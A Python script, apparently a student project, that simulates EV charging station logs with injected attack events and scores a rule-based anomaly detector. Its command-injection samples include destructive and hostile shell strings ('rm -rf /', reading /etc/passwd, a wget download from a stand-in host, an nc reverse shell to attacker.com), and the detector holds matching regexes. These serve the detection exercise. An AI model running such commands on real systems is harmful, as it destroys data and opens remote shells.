#!/usr/bin/env python3
"""
EVCS Log Anomali Simülatörü
EV Şarj İstasyonu Log Anomali Simülasyonu ve Tespit Sistemi
Hazırlayan: Eren Can Utku - Fırat Üniversitesi, Yazılım Mühendisliği
"""

import random
import re
import json
import time
from datetime import datetime, timedelta
from typing import List, Dict, Tuple, Optional

class EVCSLogSimulator:
    def __init__(self, seed: int = 12345):
        random.seed(seed)
        self.attack_types = [
            "CREDENTIAL_LEAK",           # Açık kimlik bilgisi sızıntısı
            "COMMAND_INJECTION",         # Komut enjeksiyonu
            "PRICE_MANIPULATION",        # Fiyat manipülasyonu
            "SESSION_HIJACK",           # Oturum ele geçirme
            "DOS_ATTACK",               # Hizmet engelleme
            "FIRMWARE_TAMPER",          # Firmware manipülasyonu
            "MESSAGE_SPOOFING",         # Mesaj sahteciliği
            "UNAUTHORIZED_ACCESS",      # Yetkisiz erişim
            "DATA_EXFILTRATION",       # Veri sızıntısı
            "REPLAY_ATTACK"            # Yeniden oynatma saldırısı
        ]

        self.stations = [f"EVS{i:03d}" for i in range(1, 51)]  # 50 şarj istasyonu
        self.users = [f"user{i:04d}" for i in range(1, 201)]   # 200 kullanıcı

    def generate_token(self, length: int = 12) -> str:
        """Güvenlik token'ı oluştur"""
        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"
        return ''.join(random.choice(chars) for _ in range(length))

    def mask_credential(self, credential: str, visible_chars: int = 4) -> str:
        """Kimlik bilgilerini maskele"""
        if len(credential) <= visible_chars:
            return "*" * len(credential)
        return credential[:visible_chars] + "*" * (len(credential) - visible_chars)

    def generate_ip_address(self) -> str:
        """Rastgele IP adresi oluştur"""
        return f"{random.randint(192, 203)}.{random.randint(168, 172)}.{random.randint(1, 255)}.{random.randint(1, 254)}"

    def generate_timestamp(self, base_time: datetime) -> datetime:
        """Rastgele zaman damgası oluştur"""
        offset = timedelta(seconds=random.randint(0, 3600))
        return base_time + offset

    def create_normal_event(self, event_id: int, timestamp: datetime) -> Dict:
        """Normal sistem olayı oluştur"""
        user = random.choice(self.users)
        station = random.choice(self.stations)
        token = self.generate_token()
        masked_token = self.mask_credential(token, 3)
        ip = self.generate_ip_address()
        severity = random.choice(["INFO", "WARNING"])

        event_types = [
            f"INFO EVENT {event_id} - user={user} - auth token={masked_token} - ip={ip}",
            f"INFO EVENT {event_id} - station={station} - charging_start user={user} - session_id={self.generate_token(8)}",
            f"INFO EVENT {event_id} - station={station} - charging_complete user={user} - energy={random.randint(15, 80)}kWh",
            f"INFO EVENT {event_id} - user={user} - payment_success amount={random.randint(50, 300)}TL - method=card",
            f"INFO EVENT {event_id} - station={station} - status_check result=OK - temp={random.randint(25, 45)}C"
        ]

        return {
            "id": event_id,
            "event_id": event_id,
            "station_id": station,
            "event_type": "NORMAL_OPERATION",
            "severity": severity,
            "timestamp": timestamp,
            "message": random.choice(event_types),
            "attack_type": None,
            "is_anomaly": False
        }

    def create_attack_event(self, event_id: int, timestamp: datetime, attack_type: str) -> Dict:
        """Saldırı olayı oluştur"""
        user = random.choice(self.users)
        station = random.choice(self.stations)
        ip = self.generate_ip_address()
        description = ""

        if attack_type == "CREDENTIAL_LEAK":
            token = self.generate_token()
            description = "Kullanıcı kimlik bilgisi sızıntısı tespit edildi"
            message = f"ALERT EVENT {event_id} - user={user} - auth token={token} - ip={ip} - session_start"

        elif attack_type == "COMMAND_INJECTION":
            malicious_commands = [
                "rm -rf /; reboot",
                "; cat /etc/passwd",
                "&& wget malicious.com/shell.sh",
                "| nc -e /bin/bash attacker.com 4444",
                "; python -c \"import os; os.system('id')\""
            ]
            payload = random.choice(malicious_commands)
            message = f"WARN EVENT {event_id} - user={user} - command_param=\"{payload}\" - note=possible_injection - ip={ip}"
            description = "Komut enjeksiyonu girişimi"

        elif attack_type == "PRICE_MANIPULATION":
            new_price = random.randint(1, 5)  # Anormal düşük fiyat
            api_key = self.generate_token(16)
            masked_api_key = self.mask_credential(api_key, 4)
            message = f"ALERT EVENT {event_id} - admin_api - set_price station={station} price={new_price}TL/kWh - source=api_key_{masked_api_key} - ip={ip}"
            description = "Fiyat manipülasyonu tespit edildi"

        elif attack_type == "SESSION_HIJACK":
            hijacked_token = self.generate_token()
            masked_hijacked_token = self.mask_credential(hijacked_token, 4)
            original_user = random.choice(self.users)
            message = f"INFO EVENT {event_id} - user={user} - session_resume token={masked_hijacked_token} - original_user={original_user} - status=hijacked - ip={ip}"
            description = "Oturum ele geçirme şüphesi"

        elif attack_type == "DOS_ATTACK":
            message = f"ERROR EVENT {event_id} - connection_flood from={ip} - requests_per_sec={random.randint(500, 2000)} - status=rate_limit_exceeded"
            description = "DoS saldırısı tespit edildi"

        elif attack_type == "FIRMWARE_TAMPER":
            version = f"v{random.randint(1, 5)}.{random.randint(0, 9)}.{random.randint(0, 99)}"
            checksum = self.generate_token(32)
            message = f"CRITICAL EVENT {event_id} - firmware_update station={station} version={version} - checksum={checksum} - source=unknown - ip={ip}"
            description = "Firmware manipülasyonu tespit edildi"

        elif attack_type == "MESSAGE_SPOOFING":
            fake_station = random.choice(self.stations)
            message = f"WARN EVENT {event_id} - message_integrity_fail station={fake_station} - spoofed_sender={ip} - original_station={station}"
            description = "Mesaj sahteciliği şüphesi"

        elif attack_type == "UNAUTHORIZED_ACCESS":
            message = f"ALERT EVENT {event_id} - unauthorized_admin_access user={user} - privilege_escalation=true - ip={ip} - timestamp_anomaly=detected"
            description = "Yetkisiz yönetici erişimi"

        elif attack_type == "DATA_EXFILTRATION":
            data_size = random.randint(100, 1000)
            message = f"WARN EVENT {event_id} - data_transfer user={user} - unusual_volume={data_size}MB - destination={ip} - encrypted=false"
            description = "Veri sızıntısı girişimi"

        elif attack_type == "REPLAY_ATTACK":
            old_timestamp = timestamp - timedelta(hours=random.randint(1, 24))
            message = f"ERROR EVENT {event_id} - replay_detected user={user} - original_timestamp={old_timestamp.isoformat()} - current_timestamp={timestamp.isoformat()}"
            description = "Replay saldırısı tespit edildi"

        return {
            "id": event_id,
            "event_id": event_id,
            "station_id": station,
            "event_type": "SECURITY_ALERT",
            "severity": "CRITICAL",
            "timestamp": timestamp,
            "message": message,
            "description": description,
            "attack_type": attack_type,
            "is_anomaly": True
        }

    def generate_logs(self, num_events: int = 500, anomaly_ratio: float = 0.15, start_time: Optional[datetime] = None, count: Optional[int] = None) -> List[Dict]:
        """Log simülasyonu çalıştır"""
        total_events = count if count is not None else num_events
        return self.simulate_logs(total_events, anomaly_ratio, start_time=start_time)

    def create_anomaly_event(self, event_id: int, timestamp: datetime) -> Dict:
        """Rastgele anomali olayı oluştur"""
        attack_type = random.choice(self.attack_types)
        return self.create_attack_event(event_id, timestamp, attack_type)

    def create_specific_anomaly(self, attack_type: str, event_id: int, timestamp: datetime) -> Dict:
        """Belirli tip anomali olayı oluştur"""
        return self.create_attack_event(event_id, timestamp, attack_type)

    def simulate_logs(self, num_events: int = 500, attack_probability: float = 0.15, start_time: Optional[datetime] = None) -> List[Dict]:
        """Log simülasyonu çalıştır"""
        events = []
        base_time = start_time if start_time else datetime.now() - timedelta(days=1)

        for i in range(1, num_events + 1):
            timestamp = self.generate_timestamp(base_time)

            if random.random() < attack_probability:
                attack_type = random.choice(self.attack_types)
                event = self.create_attack_event(i, timestamp, attack_type)
            else:
                event = self.create_normal_event(i, timestamp)

            events.append(event)

        # Zaman sırasına göre sırala
        events.sort(key=lambda x: x['timestamp'])
        return events

class AnomalyDetector:
    def __init__(self):
        self.detection_rules = {
            "CREDENTIAL_LEAK": self._detect_credential_leak,
            "COMMAND_INJECTION": self._detect_command_injection,
            "PRICE_MANIPULATION": self._detect_price_manipulation,
            "SESSION_HIJACK": self._detect_session_hijack,
            "DOS_ATTACK": self._detect_dos_attack,
            "FIRMWARE_TAMPER": self._detect_firmware_tamper,
            "MESSAGE_SPOOFING": self._detect_message_spoofing,
            "UNAUTHORIZED_ACCESS": self._detect_unauthorized_access,
            "DATA_EXFILTRATION": self._detect_data_exfiltration,
            "REPLAY_ATTACK": self._detect_replay_attack
        }

    def _detect_credential_leak(self, message: str) -> Tuple[bool, str]:
        """Açık kimlik bilgisi sızıntısı tespiti"""
        token_pattern = r"auth token=([A-Za-z0-9]{8,})"
        match = re.search(token_pattern, message)
        if match and "*" not in match.group(1):
            return True, f"Açık token tespit edildi: {match.group(1)[:6]}..."
        return False, ""

    def _detect_command_injection(self, message: str) -> Tuple[bool, str]:
        """Komut enjeksiyonu tespiti"""
        dangerous_patterns = [
            r"(rm\s+-rf|;\s*reboot|shutdown)",
            r"(cat\s+/etc/passwd|/bin/bash)",
            r"(wget\s+\w+|nc\s+-e)",
            r"(python\s+-c|import\s+os)"
        ]
        for pattern in dangerous_patterns:
            if re.search(pattern, message, re.IGNORECASE):
                return True, f"Şüpheli komut kalıbı: {pattern}"
        return False, ""

    def _detect_price_manipulation(self, message: str) -> Tuple[bool, str]:
        """Fiyat manipülasyonu tespiti"""
        if "set_price" in message:
            price_match = re.search(r"price=(\d+)", message)
            if price_match:
                price = int(price_match.group(1))
                if price < 10:  # Normal şarj fiyatı 10TL/kWh'den düşük olmamalı
                    return True, f"Anormal düşük fiyat: {price}TL/kWh"
        return False, ""

    def _detect_session_hijack(self, message: str) -> Tuple[bool, str]:
        """Oturum ele geçirme tespiti"""
        if "session_resume" in message and "original_user" in message:
            return True, "Oturum ele geçirme şüphesi"
        return False, ""

    def _detect_dos_attack(self, message: str) -> Tuple[bool, str]:
        """DoS saldırısı tespiti"""
        if "connection_flood" in message or "rate_limit_exceeded" in message:
            rate_match = re.search(r"requests_per_sec=(\d+)", message)
            if rate_match and int(rate_match.group(1)) > 100:
                return True, f"DoS saldırısı: {rate_match.group(1)} req/sec"
        return False, ""

    def _detect_firmware_tamper(self, message: str) -> Tuple[bool, str]:
        """Firmware manipülasyonu tespiti"""
        if "firmware_update" in message and "source=unknown" in message:
            return True, "Yetkisiz firmware güncellemesi"
        return False, ""

    def _detect_message_spoofing(self, message: str) -> Tuple[bool, str]:
        """Mesaj sahteciliği tespiti"""
        if "message_integrity_fail" in message or "spoofed_sender" in message:
            return True, "Mesaj bütünlüğü ihlali"
        return False, ""

    def _detect_unauthorized_access(self, message: str) -> Tuple[bool, str]:
        """Yetkisiz erişim tespiti"""
        if "unauthorized_admin_access" in message or "privilege_escalation=true" in message:
            return True, "Yetkisiz yönetici erişimi"
        return False, ""

    def _detect_data_exfiltration(self, message: str) -> Tuple[bool, str]:
        """Veri sızıntısı tespiti"""
        if "unusual_volume" in message and "encrypted=false" in message:
            volume_match = re.search(r"unusual_volume=(\d+)MB", message)
            if volume_match and int(volume_match.group(1)) > 100:
                return True, f"Büyük veri transferi: {volume_match.group(1)}MB"
        return False, ""

    def _detect_replay_attack(self, message: str) -> Tuple[bool, str]:
        """Yeniden oynatma saldırısı tespiti"""
        if "replay_detected" in message:
            return True, "Replay saldırısı tespit edildi"
        return False, ""

    def analyze_event(self, event: Dict) -> Dict:
        """Tek bir olayı analiz et"""
        message = event['message']
        detections = []

        for attack_type, detection_func in self.detection_rules.items():
            detected, reason = detection_func(message)
            if detected:
                detections.append({
                    "type": attack_type,
                    "reason": reason
                })

        return {
            "event_id": event['id'],
            "detected": len(detections) > 0,
            "detections": detections,
            "ground_truth": event['attack_type']
        }

    def analyze_logs(self, events: List[Dict]) -> Dict:
        """Tüm logları analiz et ve metrikler hesapla"""
        results = []
        TP = FP = FN = TN = 0

        for event in events:
            analysis = self.analyze_event(event)
            results.append(analysis)

            # Confusion matrix hesapla
            is_actual_attack = event['is_anomaly']
            is_detected = analysis['detected']

            if is_actual_attack and is_detected:
                TP += 1
            elif is_actual_attack and not is_detected:
                FN += 1
            elif not is_actual_attack and is_detected:
                FP += 1
            else:
                TN += 1

        total = TP + FP + FN + TN
        exposure_count = TP + FN
        detected_count = TP + FP

        metrics = {
            "total_events": total,
            "TP": TP, "FP": FP, "FN": FN, "TN": TN,
            "exposure_count": exposure_count,
            "detected_count": detected_count,
            "exposure_rate": exposure_count / total if total > 0 else 0,
            "detection_rate": TP / exposure_count if exposure_count > 0 else 0,
            "precision": TP / detected_count if detected_count > 0 else 0,
            "accuracy": (TP + TN) / total if total > 0 else 0,
            "f1_score": 2 * TP / (2 * TP + FP + FN) if (2 * TP + FP + FN) > 0 else 0
        }

        metrics["risk_score"] = metrics["exposure_rate"] * (1 - metrics["detection_rate"]) * 100

        return {
            "metrics": metrics,
            "results": results,
            "events": events
        }

def save_logs_to_file(events: List[Dict], filename: str):
    """Logları dosyaya kaydet"""
    with open(filename, 'w', encoding='utf-8') as f:
        for event in events:
            timestamp_str = event['timestamp'].isoformat()
            f.write(f"{timestamp_str} - {event['message']}\n")

def main():
    """Ana simülasyon fonksiyonu"""
    print("EVCS Log Anomali Simülatörü başlatılıyor...")

    # Simülatör oluştur
    simulator = EVCSLogSimulator()

    # Logları simüle et
    events = simulator.simulate_logs(num_events=500, attack_probability=0.15)
    print(f"✓ {len(events)} log olayı oluşturuldu")

    # Tespit sistemi oluştur
    detector = AnomalyDetector()

    # Analiz yap
    analysis = detector.analyze_logs(events)
    print(f"✓ Log analizi tamamlandı")

    # Sonuçları kaydet
    save_logs_to_file(events, "evcs_system_detailed.log")

    with open("evcs_analysis_results.json", 'w', encoding='utf-8') as f:
        # JSON serileştirme için datetime objelerini string'e çevir
        events_serializable = []
        for event in events:
            event_copy = event.copy()
            event_copy['timestamp'] = event_copy['timestamp'].isoformat()
            events_serializable.append(event_copy)

        analysis_serializable = analysis.copy()
        analysis_serializable['events'] = events_serializable

        json.dump(analysis_serializable, f, ensure_ascii=False, indent=2)

    # Özet rapor
    metrics = analysis['metrics']
    print("\n" + "="*60)
    print("              EVCS GÜVENLİK ANALİZİ RAPORU")
    print("="*60)
    print(f"Toplam Olay       : {metrics['total_events']}")
    print(f"Gerçek Saldırı    : {metrics['exposure_count']}")
    print(f"Tespit Edilen     : {metrics['detected_count']}")
    print(f"True Positive     : {metrics['TP']}")
    print(f"False Positive    : {metrics['FP']}")
    print(f"False Negative    : {metrics['FN']}")
    print(f"True Negative     : {metrics['TN']}")
    print("-" * 60)
    print(f"Doğruluk (Accuracy)    : {metrics['accuracy']:.2%}")
    print(f"Hassaslık (Recall)     : {metrics['detection_rate']:.2%}")
    print(f"Kesinlik (Precision)   : {metrics['precision']:.2%}")
    print(f"F1 Score              : {metrics['f1_score']:.3f}")
    print(f"Risk Skoru            : {metrics['risk_score']:.2f}")
    print("="*60)

    print("\nDosyalar oluşturuldu:")
    print("- evcs_system_detailed.log (Log dosyası)")
    print("- evcs_analysis_results.json (Analiz sonuçları)")

if __name__ == "__main__":
    main()
